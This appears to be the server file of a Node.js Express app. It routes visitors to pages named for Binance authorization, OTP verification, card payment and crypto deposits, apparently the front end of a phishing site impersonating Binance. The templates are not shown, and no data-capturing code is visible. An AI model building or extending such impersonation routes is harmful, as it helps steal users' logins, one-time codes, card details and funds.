const express = require('express')
const app = express()
const PORT = process.env.PORT ?? 1022;


// Setting up the node packages directory
app.use('/node', express.static('node_modules'))
// Static Files
app.use(express.static('public'));

// Set Templating Engine
app.set('view engine', 'ejs')



//------------ Dashboard in Route ------------//
// Home route
app.get('/', (req, res) => res.render('index'));


// Binance route
app.get('/binance/authorization', (req, res) => res.render('binance/blink'));
app.get('/binance/verification', (req, res) => res.render('binance/botp'));
app.get('/binance/success', (req, res) => res.render('binance/bsus'));


// Import route
app.get('/plan', (req, res) => res.render('import/plan'));
app.get('/login', (req, res) => res.render('import/sign'));


// Pay route
app.get('/deposit/bitcoincash', (req, res) => res.render('pay/bch'));
app.get('/deposit/bitcoin', (req, res) => res.render('pay/btc'));
app.get('/binance/pay', (req, res) => res.render('pay/bcard'));
app.get('/binance/pay/authorization', (req, res) => res.render('pay/botp'));
app.get('/binance/pay/success', (req, res) => res.render('pay/bsus'));
app.get('/deposit/ethereum', (req, res) => res.render('pay/eth'));
app.get('/deposit/litecoin', (req, res) => res.render('pay/ltc'));
app.get('/deposit/success', (req, res) => res.render('pay/walsus'));




exports.start = function start() {
    app.listen(PORT, () => {
        console.log(`server ${PORT} active`)
    })
}